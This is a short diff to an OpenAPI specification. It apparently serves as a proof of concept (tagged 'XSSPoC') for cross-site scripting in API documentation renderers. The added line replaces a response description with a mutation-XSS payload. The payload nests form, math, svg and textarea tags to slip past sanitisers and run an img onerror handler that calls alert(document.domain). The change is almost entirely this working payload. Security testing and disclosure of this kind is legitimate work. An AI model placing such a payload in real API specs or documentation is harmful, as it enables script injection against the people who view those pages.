@@ -18,7 +18,7 @@ paths:
     get:
       responses:
         '200':
-          description: No response was specified
+          description: No response '>"> <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.domain) src=1>"></form>was specified
       tags:
         - XSSPoC
       operationId: findAccounts
